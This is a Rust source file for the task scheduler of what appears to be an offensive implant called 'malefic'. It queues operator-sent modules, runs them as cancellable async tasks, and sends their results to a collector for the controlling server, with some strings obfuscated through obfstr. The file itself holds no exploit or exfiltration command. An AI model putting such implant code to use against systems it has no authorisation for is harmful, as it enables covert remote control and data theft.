use std::collections::HashMap;
use malefic_helper::debug;
use modules::{Input, MaleficModule, Output, TaskResult};
use malefic_helper::protobuf::implantpb::Spite;
use async_std::channel::{Sender, Receiver};
use async_std::channel::unbounded as channel;
use malefic_helper::protobuf::implantpb::spite::Body;
use std::time::Duration;

use async_std::task::{sleep, spawn};
use async_std::task::JoinHandle as Handle;
use futures::{select, FutureExt};
use crate::common::common::{new_empty_spite, new_spite};
use crate::common::error::MaleficError;

pub struct Task {
    id: u32,
}

pub enum TaskOperator {
    // AddTask(u32),
    CancelTask(u32),
    FinishTask(u32),
    QueryTask(u32),
    _QueryTaskStatus(u32)
}

pub struct TaskManager{
    tasks: HashMap<u32, (Sender<Body>, Handle<()>)>,
}

impl TaskManager{
    fn new() -> TaskManager {
        TaskManager {
            tasks: HashMap::new(),
        }
    }

    async fn do_operator(&mut self, op: TaskOperator) -> Result<Option<Spite>, MaleficError> {
        match op {
            TaskOperator::CancelTask(id) => {
                if let Some((_, handle)) = self.tasks.remove_entry(&id) {
                    handle.1.cancel().await;
                    Ok(Some(new_empty_spite(id, obfstr::obfstr!("cancel_task").to_string())))
                } else {
                    Err(MaleficError::TaskNotFound)
                }
            },
            TaskOperator::QueryTask(id) => {
                if let Some((_, _)) = self.tasks.get(&id) {
                    Ok(Some(new_empty_spite(id, obfstr::obfstr!("query_task").to_string())))
                } else {
                    Err(MaleficError::TaskNotFound)
                }
            },
            TaskOperator::FinishTask(id) => {
                self.tasks.remove_entry(&id);
                Ok(None)
            },
            _ => {
                Err(MaleficError::TaskOperatorNotFound)
            }
        }
    }
}

impl Task {
    async fn run(&mut self,
                 id: u32,
                 mut module: Box<MaleficModule>,
                 recv_channel: &mut Input,
                 send_channel: &mut Output) -> anyhow::Result<TaskResult> {
        debug!("Running task {}", self.id);
        module.run(id, recv_channel, send_channel).await
    }
}

// 调度器结构体
pub struct Scheduler
{
    manager: TaskManager,

    // 用于接收新Task任务
    task_sender: Sender<(bool, u32, Box<MaleficModule>, Body)>,
    task_receiver: Receiver<(bool, u32, Box<MaleficModule>, Body)>,

    // 用于接收Task运行结果 这里的结果全立即发送给客户端
    _result_sender: Sender<TaskResult>,
    result_receiver: Receiver<TaskResult>,

    // 管理module与task
    ctrl_sender: Sender<TaskOperator>,
    ctrl_receiver: Receiver<TaskOperator>,

    // 向数据收集器发送数据
    data_sender: Sender<Spite>
}

impl Scheduler
{
    // 创建一个新的调度器
    pub fn new(collector_data_sender: Sender<Spite>) -> Scheduler {
        let (_result_sender, result_receiver) = channel();
        let (task_sender, task_receiver) = channel();
        let (task_ctrl_sender, task_ctrl_receiver) = channel();
        Scheduler {
            manager: TaskManager::new(),
            task_sender,
            task_receiver,
            _result_sender,
            result_receiver,
            ctrl_sender: task_ctrl_sender,
            ctrl_receiver: task_ctrl_receiver,
            data_sender: collector_data_sender
        }
    }

    pub fn get_task_sender(&self) -> Sender<(bool, u32, Box<MaleficModule>, Body)> {
        self.task_sender.clone()
    }

    pub fn get_task_ctrl_sender(&self) -> Sender<TaskOperator> {
        self.ctrl_sender.clone()
    }

    // 运行调度器
    pub async fn run(&mut self) -> Result<(), ()> {
        loop {
            select! {
                task_recv = self.task_receiver.recv().fuse() => {
                    if let Ok((is_async, id, module, body)) = task_recv {
                        if let Some((sender, _)) = self.manager.tasks.get(&id) {
                            debug!("task {} is running", id);
                            if sender.send(body).await.is_ok() {
                                debug!("task {} send data", id);
                                continue;
                            }
                        }else{ self.handle_task(is_async, id, module, body).await; }
                    }
                },
                result_recv = self.result_receiver.recv().fuse() => {
                    if let Ok(result) = result_recv {
                        debug!("Scheduler receiver result: {:#?}", result);
                        let _ = self.data_sender.send(new_spite(result.task_id, String::new(), result.body)).await;
                    }
                },
                ctrl_recv = self.ctrl_receiver.recv().fuse() => {
                    if let Ok(op) = ctrl_recv {
                        match self.manager.do_operator(op).await {
                            Ok(spite) => {
                                if let Some(spite) = spite {
                                    let _ = self.data_sender.send(spite).await;
                                }
                            },
                            Err(e) => {
                                debug!("Scheduler do_operator error: {}", e.to_string());
                            }
                        }
                    }
                }
            }
            sleep(Duration::from_nanos(1)).await;
        }
    }

    async fn handle_task(&mut self, _is_async: bool, id: u32, module: Box<MaleficModule>, body: Body) {
        let async_sender = self.data_sender.clone();
        let result_sender = self.data_sender.clone();
        let end_sender = self.get_task_ctrl_sender().clone();
        let (task_data_sender, task_data_receiver) = channel();
        let handle = spawn(async move {
            let (body_sender, mut body_receiver) = channel();
            let (mut result_sender, result_receiver): (Sender<TaskResult>, Receiver<TaskResult>) = channel();
            let output_stream = spawn(async move {
                loop {
                    if let Ok(result) = result_receiver.recv().await {
                        let _ = async_sender.send(result.to_spite()).await;
                    }else{
                        break
                    }
                }
            });

            let input_stream = spawn(async move {
                let _ = body_sender.send(body).await;
                loop {
                    if let Ok(body) = task_data_receiver.recv().await {
                        let _ = body_sender.send(body).await;
                    }else {
                        break
                    }
                }
            });

            let mut task = Task { id };
            let task_handle = task.run(id, module, &mut body_receiver, &mut result_sender);

            select! {
                _ = input_stream.fuse() => {
                    debug!("test_handle finished");
                }
                _ = output_stream.fuse() => {
                    debug!("message_handle finished");
                },
                data = task_handle.fuse() => {
                    debug!("task_handle findished");
                    match data {
                        Ok(result) => {
                            let _ = result_sender.send(result).await;
                        },
                        Err(e) => {
                            debug!("task {} error, {}", id, e.to_string());
                            let _ = result_sender.send(TaskResult::new_with_error(id, e.into())).await;
                        }
                    }
                }
            }
            drop(result_sender);
            let _ = end_sender.send(TaskOperator::FinishTask(id)).await;
            debug!("[+] task is end!");
        });

        self.manager.tasks.insert(id, (task_data_sender, handle));
    }
}
